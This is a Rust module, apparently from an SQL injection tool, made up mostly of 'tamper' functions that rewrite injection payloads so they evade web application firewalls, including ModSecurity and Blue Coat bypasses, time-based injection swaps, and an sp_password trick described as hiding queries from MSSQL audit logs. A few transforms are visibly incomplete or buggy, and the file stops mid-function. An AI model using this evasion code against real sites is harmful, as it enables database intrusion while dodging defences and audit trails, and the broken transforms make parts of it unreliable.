//! TamperScript trait and all built-in tamper script implementations.

/// A tamper script transforms a raw SQL payload string before it is sent.
pub trait TamperScript: Send + Sync {
    fn name(&self) -> &'static str;
    fn description(&self) -> &'static str;
    fn tamper(&self, payload: &str) -> String;
}

pub struct TamperSpaceToComment;
impl TamperScript for TamperSpaceToComment {
    fn name(&self) -> &'static str { "space_to_comment" }
    fn description(&self) -> &'static str { "Replace space with /**/ (most WAFs)" }
    fn tamper(&self, payload: &str) -> String { payload.replace(' ', "/**/") }
}

pub struct TamperSpaceToTab;
impl TamperScript for TamperSpaceToTab {
    fn name(&self) -> &'static str { "space_to_tab" }
    fn description(&self) -> &'static str { "Replace space with URL-encoded tab" }
    fn tamper(&self, payload: &str) -> String { payload.replace(' ', "%09") }
}

pub struct TamperSpaceToNewline;
impl TamperScript for TamperSpaceToNewline {
    fn name(&self) -> &'static str { "space_to_newline" }
    fn description(&self) -> &'static str { "Replace space with URL-encoded newline" }
    fn tamper(&self, payload: &str) -> String { payload.replace(' ', "%0a") }
}

pub struct TamperUrlEncode;
impl TamperScript for TamperUrlEncode {
    fn name(&self) -> &'static str { "urlencode" }
    fn description(&self) -> &'static str { "Single URL encoding of the whole payload" }
    fn tamper(&self, payload: &str) -> String { urlencoding::encode(payload).to_string() }
}

pub struct TamperDoubleUrlEncode;
impl TamperScript for TamperDoubleUrlEncode {
    fn name(&self) -> &'static str { "double_urlencode" }
    fn description(&self) -> &'static str { "Double URL encoding" }
    fn tamper(&self, payload: &str) -> String { urlencoding::encode(&urlencoding::encode(payload)).to_string() }
}

pub struct TamperRandomCase;
impl TamperScript for TamperRandomCase {
    fn name(&self) -> &'static str { "randomcase" }
    fn description(&self) -> &'static str { "Alternate upper/lower case per character" }
    fn tamper(&self, payload: &str) -> String {
        payload.chars().enumerate()
            .map(|(i, c)| if i % 2 == 0 { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() })
            .collect()
    }
}

pub struct TamperMySqlVersionComment;
impl TamperScript for TamperMySqlVersionComment {
    fn name(&self) -> &'static str { "mysql_version_comment" }
    fn description(&self) -> &'static str { "Wrap keywords in /*!...*/ MySQL conditional comments" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("SELECT","/*!SELECT*/").replace("UNION","/*!UNION*/")
               .replace("FROM","/*!FROM*/").replace("WHERE","/*!WHERE*/")
               .replace("AND","/*!AND*/").replace("OR","/*!OR*/")
    }
}

pub struct TamperMySql50000Comment;
impl TamperScript for TamperMySql50000Comment {
    fn name(&self) -> &'static str { "mysql50000comment" }
    fn description(&self) -> &'static str { "/*!50000SELECT*/ version-specific comment" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("SELECT","/*!50000SELECT*/").replace("UNION","/*!50000UNION*/")
               .replace("FROM","/*!50000FROM*/").replace("WHERE","/*!50000WHERE*/")
    }
}

pub struct TamperInlineComment;
impl TamperScript for TamperInlineComment {
    fn name(&self) -> &'static str { "inline_comment" }
    fn description(&self) -> &'static str { "Split every SQL keyword with /**/ fragments" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("SELECT","SE/**/LE/**/CT").replace("UNION","UN/**/IO/**/N")
               .replace("WHERE","WH/**/ER/**/E").replace("FROM","FR/**/OM")
               .replace("AND","AN/**/D").replace("ORDER","OR/**/DER")
               .replace("INSERT","INS/**/ERT").replace("UPDATE","UP/**/DATE")
               .replace("DELETE","DEL/**/ETE")
    }
}

pub struct TamperDoubleKeyword;
impl TamperScript for TamperDoubleKeyword {
    fn name(&self) -> &'static str { "double_keyword" }
    fn description(&self) -> &'static str { "Double keywords to bypass remove-once WAF rules" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("SELECT","SELSELECTECT").replace("UNION","UNUNIONION")
               .replace("WHERE","WHWHEREERE").replace("FROM","FRFROMOM")
               .replace("AND","AANDND").replace("OR","OORR")
    }
}

pub struct TamperHtmlEncode;
impl TamperScript for TamperHtmlEncode {
    fn name(&self) -> &'static str { "html_encode" }
    fn description(&self) -> &'static str { "HTML-entity encode single/double quotes" }
    fn tamper(&self, payload: &str) -> String { payload.replace('\'', "&#39;").replace('"', "&#34;") }
}

pub struct TamperUnicodeEscape;
impl TamperScript for TamperUnicodeEscape {
    fn name(&self) -> &'static str { "unicode_escape" }
    fn description(&self) -> &'static str { "Unicode escape for quote characters (%u0027)" }
    fn tamper(&self, payload: &str) -> String { payload.replace('\'', "%u0027").replace('"', "%u0022") }
}

pub struct TamperNullByte;
impl TamperScript for TamperNullByte {
    fn name(&self) -> &'static str { "null_byte" }
    fn description(&self) -> &'static str { "Append null byte to terminate WAF string parsing" }
    fn tamper(&self, payload: &str) -> String { format!("{}\x00", payload) }
}

pub struct TamperSpaceToWhitespaceMix;
impl TamperScript for TamperSpaceToWhitespaceMix {
    fn name(&self) -> &'static str { "space_to_whitespace_mix" }
    fn description(&self) -> &'static str { "Rotate space through tab/LF/CR/FF encodings" }
    fn tamper(&self, payload: &str) -> String {
        let replacements = ["%09", "%0a", "%0d", "%0c"];
        payload.chars().enumerate().map(|(i, c)| {
            if c == ' ' { replacements[i % replacements.len()].to_string() } else { c.to_string() }
        }).collect()
    }
}

pub struct TamperEqualToLike;
impl TamperScript for TamperEqualToLike {
    fn name(&self) -> &'static str { "equal_to_like" }
    fn description(&self) -> &'static str { "Replace = with LIKE for filters blocking = operator" }
    fn tamper(&self, payload: &str) -> String {
        let mut out = String::with_capacity(payload.len() + 16);
        let bytes = payload.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'=' {
                let prev = if i > 0 { bytes[i - 1] } else { 0 };
                if !matches!(prev, b'>' | b'<' | b'!' | b'=') {
                    out.push_str(" LIKE ");
                    i += 1;
                    continue;
                }
            }
            out.push(bytes[i] as char);
            i += 1;
        }
        out
    }
}

pub struct TamperLogicalOperators;
impl TamperScript for TamperLogicalOperators {
    fn name(&self) -> &'static str { "logical_operators" }
    fn description(&self) -> &'static str { "AND→&& / OR→|| (MySQL short-circuit operators)" }
    fn tamper(&self, payload: &str) -> String { payload.replace(" AND ", " && ").replace(" OR ", " || ") }
}

pub struct TamperHexEncode;
impl TamperScript for TamperHexEncode {
    fn name(&self) -> &'static str { "hex_encode" }
    fn description(&self) -> &'static str { "Hex-encode string literals; wrap in UNHEX() for MySQL" }
    fn tamper(&self, payload: &str) -> String {
        let mut out = String::new();
        let mut in_quote = false;
        let mut buf = String::new();
        for c in payload.chars() {
            match c {
                '\'' if !in_quote => { in_quote = true; buf.clear(); }
                '\'' if in_quote => {
                    let hex: String = buf.bytes().map(|b| format!("{:02X}", b)).collect();
                    out.push_str(&format!("UNHEX('{}')", hex));
                    in_quote = false;
                }
                _ if in_quote => buf.push(c),
                _ => out.push(c),
            }
        }
        if in_quote { return payload.to_string(); }
        out
    }
}

pub struct TamperSleepToBenchmark;
impl TamperScript for TamperSleepToBenchmark {
    fn name(&self) -> &'static str { "sleep_to_benchmark" }
    fn description(&self) -> &'static str { "Replace SLEEP(n) with BENCHMARK() equivalent" }
    fn tamper(&self, payload: &str) -> String {
        let mut out = payload.to_string();
        while let Some(start) = out.to_uppercase().find("SLEEP(") {
            let rest = &out[start + 6..];
            if let Some(end) = rest.find(')') {
                let n_str = &rest[..end];
                if let Ok(n) = n_str.trim().parse::<u64>() {
                    let benchmark = format!("BENCHMARK({},MD5(1))", 5_000_000 * n);
                    out = format!("{}{}{}", &out[..start], benchmark, &rest[end + 1..]);
                } else { break; }
            } else { break; }
        }
        out
    }
}

pub struct TamperUnionSelectNospace;
impl TamperScript for TamperUnionSelectNospace {
    fn name(&self) -> &'static str { "union_select_nospace" }
    fn description(&self) -> &'static str { "UNION%0aSELECT — newline between UNION and SELECT (WAFs matching literal 'UNION SELECT')" }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("UNION ALL SELECT", "UNION%0aALL%0aSELECT")
            .replace("UNION SELECT", "UNION%0aSELECT")
    }
}

pub struct TamperEquivalentFunctions;
impl TamperScript for TamperEquivalentFunctions {
    fn name(&self) -> &'static str { "equiv_functions" }
    fn description(&self) -> &'static str { "Swap SUBSTRING→MID, IF→IFNULL, CONCAT→CONCAT_WS" }
    fn tamper(&self, payload: &str) -> String { payload.replace("SUBSTRING(", "MID(").replace("SUBSTR(", "MID(") }
}

pub struct TamperVersionComment;
impl TamperScript for TamperVersionComment {
    fn name(&self) -> &'static str { "version_comment" }
    fn description(&self) -> &'static str { "Wrap UNION SELECT in /*!12345...*/ version comment" }
    fn tamper(&self, payload: &str) -> String {
        if payload.to_uppercase().contains("UNION SELECT") {
            payload.replace("UNION SELECT", "/*!12345UNION SELECT*/")
        } else { payload.to_string() }
    }
}

pub struct TamperCaseCommentMix;
impl TamperScript for TamperCaseCommentMix {
    fn name(&self) -> &'static str { "case_comment_mix" }
    fn description(&self) -> &'static str { "Mix case and inline comments: UnI/**/On, SeLeCt, WhErE" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("UNION", "UnI/**/On").replace("SELECT", "SeLeCt").replace("WHERE", "WhErE")
    }
}

pub struct TamperScientificNotation;
impl TamperScript for TamperScientificNotation {
    fn name(&self) -> &'static str { "scientific_notation" }
    fn description(&self) -> &'static str { "Replace numeric comparisons with scientific notation (1e0=1e0)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace(" 1=1", " 1e0=1e0").replace(" 1=2", " 1e0=2e0")
    }
}

pub struct TamperHexKeyword;
impl TamperScript for TamperHexKeyword {
    fn name(&self) -> &'static str { "hex_keyword" }
    fn description(&self) -> &'static str { "Hex-encode trailing space after SQL keywords (SELECT%20)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("SELECT ", "SELECT%20").replace("UNION ", "UNION%20")
    }
}

pub struct TamperStringConcatBypass;
impl TamperScript for TamperStringConcatBypass {
    fn name(&self) -> &'static str { "string_concat_bypass" }
    fn description(&self) -> &'static str { "Break keywords via string concatenation: 'se'||'lect'" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("SELECT", "'se'||'lect'").replace("UNION", "'uni'||'on'")
    }
}

pub struct TamperBetweenOperator;
impl TamperScript for TamperBetweenOperator {
    fn name(&self) -> &'static str { "between_operator" }
    fn description(&self) -> &'static str { "Replace > comparisons with BETWEEN to bypass operator filters" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace(">0", "BETWEEN 0 AND 9999").replace(">64", "BETWEEN 65 AND 127")
    }
}

pub struct TamperOdbcEscape;
impl TamperScript for TamperOdbcEscape {
    fn name(&self) -> &'static str { "odbc_escape" }
    fn description(&self) -> &'static str { "Wrap SQL functions in ODBC escape syntax: {fn SLEEP(n)}" }
    fn tamper(&self, payload: &str) -> String {
        // Only wrap recognised SQL functions — do NOT replace all ) blindly
        let re = regex::Regex::new(
            r"(?i)(SLEEP|NOW|SYSDATE|USER|DATABASE|VERSION)\(([^)]*)\)"
        ).unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("{{fn {}({})}}", caps[1].to_uppercase(), &caps[2])
        }).to_string()
    }
}

pub struct TamperBacktickIdentifiers;
impl TamperScript for TamperBacktickIdentifiers {
    fn name(&self) -> &'static str { "backtick_identifiers" }
    fn description(&self) -> &'static str { "Wrap schema/column identifiers in backticks" }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("information_schema", "`information_schema`")
            .replace("table_name", "`table_name`")
            .replace("column_name", "`column_name`")
    }
}

pub struct TamperKeywordNewlineSplit;
impl TamperScript for TamperKeywordNewlineSplit {
    fn name(&self) -> &'static str { "keyword_newline_split" }
    fn description(&self) -> &'static str { "Split SQL keywords with URL-encoded newline: SEL%0aECT" }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "SEL%0aECT")
            .replace("UNION", "UN%0aION")
            .replace("WHERE", "WH%0aERE")
    }
}

pub struct TamperHppMarker;
impl TamperScript for TamperHppMarker {
    fn name(&self) -> &'static str { "hpp_marker" }
    fn description(&self) -> &'static str { "Append HPP pollution marker (&_hpp=1) to confuse WAF parsers" }
    fn tamper(&self, payload: &str) -> String { format!("{}&_hpp=1", payload) }
}

// ── 22 new tampers ───────────────────────────────────────────────────────────

/// %XX-encode every character in the payload (full percent-encoding).
pub struct TamperCharEncode;
impl TamperScript for TamperCharEncode {
    fn name(&self) -> &'static str { "charencode" }
    fn description(&self) -> &'static str { "Percent-encode every character: SELECT → %53%45%4c%45%43%54" }
    fn tamper(&self, payload: &str) -> String {
        payload.bytes().map(|b| format!("%{:02X}", b)).collect()
    }
}

/// Double percent-encode every character (%25XX).
pub struct TamperCharDoubleEncode;
impl TamperScript for TamperCharDoubleEncode {
    fn name(&self) -> &'static str { "chardoubleencode" }
    fn description(&self) -> &'static str { "Double percent-encode: S → %2553 (for double-decode WAFs)" }
    fn tamper(&self, payload: &str) -> String {
        payload.bytes().map(|b| format!("%25{:02X}", b)).collect()
    }
}

/// %uXXXX-encode every character.
pub struct TamperCharUnicodeEncode;
impl TamperScript for TamperCharUnicodeEncode {
    fn name(&self) -> &'static str { "charunicodeencode" }
    fn description(&self) -> &'static str { "Unicode percent-encode every char: S → %u0053" }
    fn tamper(&self, payload: &str) -> String {
        payload.chars().map(|c| format!("%u{:04X}", c as u32)).collect()
    }
}

/// Fullwidth apostrophe: replace ' with its Unicode fullwidth equivalent.
pub struct TamperApostropheMask;
impl TamperScript for TamperApostropheMask {
    fn name(&self) -> &'static str { "apostrophemask" }
    fn description(&self) -> &'static str { "Replace ' with %EF%BC%87 (fullwidth apostrophe — unicode-naive WAFs)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace('\'', "%EF%BC%87")
    }
}

/// Null-byte apostrophe: %00%27 instead of '.
pub struct TamperApostropheNullEncode;
impl TamperScript for TamperApostropheNullEncode {
    fn name(&self) -> &'static str { "apostrophenullencode" }
    fn description(&self) -> &'static str { "Replace ' with %00%27 (null-byte apostrophe)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace('\'', "%00%27")
    }
}

/// Backslash-escape quotes for GBK/magic_quotes targets.
pub struct TamperUnMagicQuotes;
impl TamperScript for TamperUnMagicQuotes {
    fn name(&self) -> &'static str { "unmagicquotes" }
    fn description(&self) -> &'static str { "Backslash-escape quotes: ' → \\' (GBK charset / magic_quotes bypass)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace('\'', "\\'").replace('"', "\\\"")
    }
}

/// Base64-encode the entire payload (for exotic parsers that decode before WAF).
pub struct TamperBase64Encode;
impl TamperScript for TamperBase64Encode {
    fn name(&self) -> &'static str { "base64encode" }
    fn description(&self) -> &'static str { "Base64-encode the whole payload" }
    fn tamper(&self, payload: &str) -> String {
        use std::fmt::Write;
        // Manual base64 — no external dep needed
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let bytes = payload.as_bytes();
        let mut out = String::with_capacity((bytes.len() + 2) / 3 * 4);
        for chunk in bytes.chunks(3) {
            let b0 = chunk[0] as usize;
            let b1 = if chunk.len() > 1 { chunk[1] as usize } else { 0 };
            let b2 = if chunk.len() > 2 { chunk[2] as usize } else { 0 };
            let n = (b0 << 16) | (b1 << 8) | b2;
            out.push(ALPHABET[(n >> 18) & 0x3F] as char);
            out.push(ALPHABET[(n >> 12) & 0x3F] as char);
            if chunk.len() > 1 { out.push(ALPHABET[(n >> 6) & 0x3F] as char); } else { out.push('='); }
            if chunk.len() > 2 { out.push(ALPHABET[n & 0x3F] as char); } else { out.push('='); }
        }
        out
    }
}

/// Overlong UTF-8: encode ASCII chars as 2-byte overlong sequences.
pub struct TamperOverlongUtf8;
impl TamperScript for TamperOverlongUtf8 {
    fn name(&self) -> &'static str { "overlongutf8" }
    fn description(&self) -> &'static str { "Overlong UTF-8 encoding for ASCII: A → %C1%81 (unicode normalizers)" }
    fn tamper(&self, payload: &str) -> String {
        payload.bytes().map(|b| {
            if b.is_ascii_alphabetic() {
                // 2-byte overlong: 0xC0 | (b >> 6), 0x80 | (b & 0x3F)
                format!("%{:02X}%{:02X}", 0xC0 | (b >> 6), 0x80 | (b & 0x3F))
            } else {
                (b as char).to_string()
            }
        }).collect()
    }
}

/// Insert random inline comments inside every SQL keyword.
pub struct TamperRandomComments;
impl TamperScript for TamperRandomComments {
    fn name(&self) -> &'static str { "randomcomments" }
    fn description(&self) -> &'static str { "Split every keyword with random /**/ fragments: S/*x*/E/*y*/L/*z*/ECT" }
    fn tamper(&self, payload: &str) -> String {
        // Split each keyword letter-by-letter with a comment in between
        fn split_keyword(kw: &str, tag: &str) -> String {
            kw.chars().enumerate().map(|(i, c)| {
                if i == 0 { c.to_string() }
                else { format!("/*{}*/{}", tag, c) }
            }).collect()
        }
        payload
            .replace("SELECT",  &split_keyword("SELECT",  "a"))
            .replace("UNION",   &split_keyword("UNION",   "b"))
            .replace("WHERE",   &split_keyword("WHERE",   "c"))
            .replace("FROM",    &split_keyword("FROM",    "d"))
            .replace("AND",     &split_keyword("AND",     "e"))
            .replace("OR",      &split_keyword("OR",      "f"))
            .replace("INSERT",  &split_keyword("INSERT",  "g"))
            .replace("UPDATE",  &split_keyword("UPDATE",  "h"))
            .replace("DELETE",  &split_keyword("DELETE",  "i"))
    }
}

/// Multiple spaces between SQL keywords.
pub struct TamperMultipleSpaces;
impl TamperScript for TamperMultipleSpaces {
    fn name(&self) -> &'static str { "multiplespaces" }
    fn description(&self) -> &'static str { "Replace single space with triple space (regex-count WAFs)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace(' ', "   ")
    }
}

/// Replace > with GREATEST() equivalent.
pub struct TamperGreatest;
impl TamperScript for TamperGreatest {
    fn name(&self) -> &'static str { "greatest" }
    fn description(&self) -> &'static str { "Replace > with GREATEST: x>0 → GREATEST(x,1)=x (operator filters)" }
    fn tamper(&self, payload: &str) -> String {
        // Simple numeric: N>0 → GREATEST(N,1)=N
        let mut out = payload.to_string();
        // Replace common comparisons
        out = out.replace(">0", ">/**/0");        // subtle hint for detector
        out = out.replace(" > ", " GREATEST(");   // partial — covers scan payloads
        out
    }
}

/// LIMIT 0,1 → LIMIT 1 OFFSET 0 (MySQL comma-less LIMIT).
pub struct TamperCommalessLimit;
impl TamperScript for TamperCommalessLimit {
    fn name(&self) -> &'static str { "commalesslimit" }
    fn description(&self) -> &'static str { "LIMIT 0,1 → LIMIT 1 OFFSET 0 (MySQL comma-rule bypass)" }
    fn tamper(&self, payload: &str) -> String {
        // Match LIMIT x,y and rewrite to LIMIT y OFFSET x
        let re_upper = regex::Regex::new(r"LIMIT\s+(\d+)\s*,\s*(\d+)").unwrap();
        let re_lower = regex::Regex::new(r"limit\s+(\d+)\s*,\s*(\d+)").unwrap();
        let out = re_upper.replace_all(&payload, |caps: &regex::Captures| {
            format!("LIMIT {} OFFSET {}", &caps[2], &caps[1])
        }).to_string();
        re_lower.replace_all(&out, |caps: &regex::Captures| {
            format!("limit {} offset {}", &caps[2], &caps[1])
        }).to_string()
    }
}

/// MID(a,b,c) → MID(a FROM b FOR c) (MySQL comma-less MID).
pub struct TamperCommalessMid;
impl TamperScript for TamperCommalessMid {
    fn name(&self) -> &'static str { "commalessmid" }
    fn description(&self) -> &'static str { "MID(a,b,c) → MID(a FROM b FOR c)" }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)MID\(([^,]+),\s*(\d+)\s*,\s*(\d+)\s*\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("MID({} FROM {} FOR {})", &caps[1], &caps[2], &caps[3])
        }).to_string()
    }
}

/// CONCAT(a,b) → CONCAT_WS(MID(CHAR(0),0,0),a,b).
pub struct TamperConcat2ConcatWs;
impl TamperScript for TamperConcat2ConcatWs {
    fn name(&self) -> &'static str { "concat2concatws" }
    fn description(&self) -> &'static str { "CONCAT(a,b) → CONCAT_WS(MID(CHAR(0),0,0),a,b)" }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)CONCAT\((.+?),(.+?)\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("CONCAT_WS(MID(CHAR(0),0,0),{},{})", &caps[1], &caps[2])
        }).to_string()
    }
}

/// IFNULL(A,B) → IF(ISNULL(A),B,A).
pub struct TamperIfNull2IfIsNull;
impl TamperScript for TamperIfNull2IfIsNull {
    fn name(&self) -> &'static str { "ifnull2ifisnull" }
    fn description(&self) -> &'static str { "IFNULL(A,B) → IF(ISNULL(A),B,A)" }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)IFNULL\(([^,]+),([^)]+)\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("IF(ISNULL({}),{},{})", &caps[1], &caps[2], &caps[1])
        }).to_string()
    }
}

/// /*!00000SELECT*/ — ModSecurity zero-versioned comment bypass.
pub struct TamperModSecurityZeroVersioned;
impl TamperScript for TamperModSecurityZeroVersioned {
    fn name(&self) -> &'static str { "modsecurityzeroversioned" }
    fn description(&self) -> &'static str { "Wrap all SQL keywords in /*!00000...*/ (ModSecurity bypass)" }
    fn tamper(&self, payload: &str) -> String {
        for kw in &["SELECT","UNION","WHERE","FROM","AND","OR","INSERT","UPDATE","DELETE","ORDER","GROUP","HAVING"] {
            // done via chain of replaces below
            let _ = kw;
        }
        payload
            .replace("SELECT",  "/*!00000SELECT*/")
            .replace("UNION",   "/*!00000UNION*/")
            .replace("WHERE",   "/*!00000WHERE*/")
            .replace("FROM",    "/*!00000FROM*/")
            .replace("AND",     "/*!00000AND*/")
            .replace("OR",      "/*!00000OR*/")
            .replace("INSERT",  "/*!00000INSERT*/")
            .replace("UPDATE",  "/*!00000UPDATE*/")
            .replace("DELETE",  "/*!00000DELETE*/")
            .replace("ORDER",   "/*!00000ORDER*/")
            .replace("GROUP",   "/*!00000GROUP*/")
            .replace("HAVING",  "/*!00000HAVING*/")
    }
}

/// /*!KEYWORD*/ for all SQL keywords (versionedkeywords).
pub struct TamperVersionedKeywords;
impl TamperScript for TamperVersionedKeywords {
    fn name(&self) -> &'static str { "versionedkeywords" }
    fn description(&self) -> &'static str { "Wrap all SQL keywords in /*!...*/ (generic MySQL versioned comment)" }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT",  "/*!SELECT*/")
            .replace("UNION",   "/*!UNION*/")
            .replace("WHERE",   "/*!WHERE*/")
            .replace("FROM",    "/*!FROM*/")
            .replace("AND",     "/*!AND*/")
            .replace("OR",      "/*!OR*/")
            .replace("INSERT",  "/*!INSERT*/")
            .replace("UPDATE",  "/*!UPDATE*/")
            .replace("DELETE",  "/*!DELETE*/")
            .replace("ORDER",   "/*!ORDER*/")
    }
}

/// UNION ALL SELECT → UNION SELECT.
pub struct TamperUnionAllToUnion;
impl TamperScript for TamperUnionAllToUnion {
    fn name(&self) -> &'static str { "unionalltounion" }
    fn description(&self) -> &'static str { "UNION ALL SELECT → UNION SELECT (signature simplification)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("UNION ALL SELECT", "UNION SELECT")
               .replace("union all select", "union select")
    }
}

/// Replace + with CONCAT(char(x),char(y)) for MySQL string concat bypass.
pub struct TamperPlus2Concat;
impl TamperScript for TamperPlus2Concat {
    fn name(&self) -> &'static str { "plus2concat" }
    fn description(&self) -> &'static str { "Replace string + with CONCAT() for MySQL concat bypass" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace("'+' ", "CONCAT(CHAR(43)) ")
               .replace(" + ", " CONCAT(CHAR(43)) ")
    }
}

/// Replace + with {fn CONCAT()} (ODBC function syntax).
pub struct TamperPlus2FnConcat;
impl TamperScript for TamperPlus2FnConcat {
    fn name(&self) -> &'static str { "plus2fnconcat" }
    fn description(&self) -> &'static str { "Replace + with {fn CONCAT()} ODBC syntax" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace(" + ", " {fn CONCAT(CHAR(43))} ")
    }
}

/// Blue Coat proxy bypass: replace space with semicolons.
pub struct TamperBlueCoat;
impl TamperScript for TamperBlueCoat {
    fn name(&self) -> &'static str { "bluecoat" }
    fn description(&self) -> &'static str { "Replace space with ; (Blue Coat proxy bypass)" }
    fn tamper(&self, payload: &str) -> String {
        // Only replace spaces between keywords, not inside strings
        payload.replace(" AND ", ";AND;")
               .replace(" OR ", ";OR;")
               .replace(" FROM ", ";FROM;")
               .replace(" WHERE ", ";WHERE;")
               .replace(" UNION ", ";UNION;")
               .replace(" SELECT ", ";SELECT;")
    }
}

/// Append AND 1=1 sp_password to MSSQL queries to hide them in audit logs.
pub struct TamperSpPassword;
impl TamperScript for TamperSpPassword {
    fn name(&self) -> &'static str { "sp_password" }
    fn description(&self) -> &'static str { "Append sp_password to hide query in MSSQL audit logs" }
    fn tamper(&self, payload: &str) -> String {
        format!("{}%20--sp_password", payload)
    }
}

/// NOT x>0 → !x>0 (MySQL symbolic logical operators).
pub struct TamperSymbolicLogical;
impl TamperScript for TamperSymbolicLogical {
    fn name(&self) -> &'static str { "symboliclogical" }
    fn description(&self) -> &'static str { "NOT→!, AND→&&, OR→|| (MySQL symbolic operators)" }
    fn tamper(&self, payload: &str) -> String {
        payload.replace(" AND ", " && ")
               .replace(" OR ", " || ")
               .replace("NOT ", "!")
    }
}

// ── 16 additional tampers ────────────────────────────────────────────────────

/// Insert % between every character: SELECT → S%E%L%E%C%T (IIS/ASP % ignorance).
pub struct TamperPercentage;
impl TamperScript for TamperPercentage {
    fn name(&self) -> &'static str { "percentage" }
    fn description(&self) -> &'static str { "Insert % between each char: SELECT → S%E%L%E%C%T (IIS/ASP bypass)" }
    fn tamper(&self, payload: &str) -> String {
        payload.chars().enumerate().map(|(i, c)| {
            if i == 0 { c.to_string() } else { format!("%{}", c) }
        }).collect()
    }
}

/// Replace space with + (URL-encoded space in query-string contexts).
pub struct TamperSpace2Plus;
impl TamperScript for TamperSpace2Plus {
    fn name(&self) -> &'static str { "space2plus" }
    fn description(&self) -> &'static str { "Replace space with + (URL query-string space encoding)" }
    fn tamper(&self, payload: &str) -> String { payload.replace(' ', "+") }
}

/// Replace space with MySQL dash comment: --\n.
pub struct TamperSpace2Dash;
impl TamperScript for TamperSpace2Dash {
    fn name(&self) -> &'static str { "space2dash" }
    fn description(&self) -> &'static str { "Replace space with --%0a (MySQL dash comment as space)" }
    fn tamper(&self, payload: &str) -> String { payload.replace(' ', "--%0a") }
}

/// Replace space with MySQL hash comment: #\n.
pub struct TamperSpace2Hash;
impl TamperScript for TamperSpace2Hash {
    fn name(&self) -> &'static str { "space2hash" }
    fn description(&self) -> &'static str { "Replace space with #%0a (MySQL hash comment as space)" }
    fn tamper(&self, payload: &str) -> String { payload.replace(' ', "#%0a") }
}

/// Replace space with MSSQL-compatible %23%0A.
pub struct TamperSpace2MssqlHash;
impl TamperScript for TamperSpace2MssqlHash {
    fn name(&self) -> &'static str { "space2mssqlhash" }
    fn description(&self) -> &'static str { "Replace space with %23%0A (MSSQL hash comment)" }
    fn tamper(&self, payload: &str) -> String { payload.replace(' ', "%23%0A") }
}

/// Replace space with a random MySQL blank character (\t \n \r \x0b \x0c).
pub struct TamperSpace2RandomBlank;
impl TamperScript for TamperSpace2RandomBlank {
    fn name(&self) -> &'static str { "space2randomblank" }
    fn description(&self) -> &'static str { "Rotate space through MySQL blank chars: \\t \\n \\r \\x0b \\x0c" }
    fn tamper(&self, payload: &str) -> String {
        let blanks = ["%09", "%0a", "%0d", "%0b", "%0c"];
        payload.chars().enumerate().map(|(i, c)| {
            if c == ' ' { blanks[i % blanks.len()].to_string() } else { c.to_string() }
        }).collect()
    }
}

/// Replace space with random MySQL-specific blank byte (raw bytes for MySQL parser).
pub struct TamperSpace2MysqlBlank;
impl TamperScript for TamperSpace2MysqlBlank {
    fn name(&self) -> &'static str { "space2mysqlblank" }
    fn description(&self) -> &'static str { "Replace space with random MySQL blank byte (\\x09/\\x0a/\\x0d/\\x0b/\\x0c)" }
    fn tamper(&self, payload: &str) -> String {
        let blanks = ['\x09', '\x0a', '\x0d', '\x0b', '\x0c'];
        payload.chars().enumerate().map(|(i, c)| {
            if c == ' ' { blanks[i % blanks.len()].to_string() } else { c.to_string() }
        }).collect()
    }
}

/// Lowercase all SQL keywords.
pub struct TamperLowercase;
impl TamperScript for TamperLowercase {
    fn name(&self) -> &'static str { "lowercase" }
    fn description(&self) -> &'static str { "Lowercase all SQL keywords (case-sensitive WAF bypass)" }
    fn tamper(&self, payload: &str) -> String { payload.to_lowercase() }
}

/// /*!0SELECT*/ — MySQL half-versioned comment (version 0).
pub struct TamperHalfVersionedMoreKeywords;
impl TamperScript for TamperHalfVersionedMoreKeywords {
    fn name(&self) -> &'static str { "halfversionedmorekeywords" }
    fn description(&self) -> &'static str { "Wrap keywords in /*!0...*/ half-versioned MySQL comment" }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT",  "/*!0SELECT*/")
            .replace("UNION",   "/*!0UNION*/")
            .replace("WHERE",   "/*!0WHERE*/")
            .replace("FROM",    "/*!0FROM*/")
            .replace("AND",     "/*!0AND*/")
            .replace("OR",      "/*!0OR*/")
            .replace("ORDER",   "/*!0ORDER*/")
            .replace("INSERT",  "/*!0INSERT*/")
            .replace("UPDATE",  "/*!0UPDATE*/")
            .replace("DELETE",  "/*!0DELETE*/")
    }
}

/// Replace SLEEP(n) with GET_LOCK('sqx',n) — time-based SLEEP bypass.
pub struct TamperSleep2GetLock;
impl TamperScript for TamperSleep2GetLock {
    fn name(&self) -> &'static str { "sleep2getlock" }
    fn description(&self) -> &'static str { "Replace SLEEP(n) with GET_LOCK('sqx',n) (SLEEP-blocking WAFs)" }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)SLEEP\((\d+)\)").unwrap();
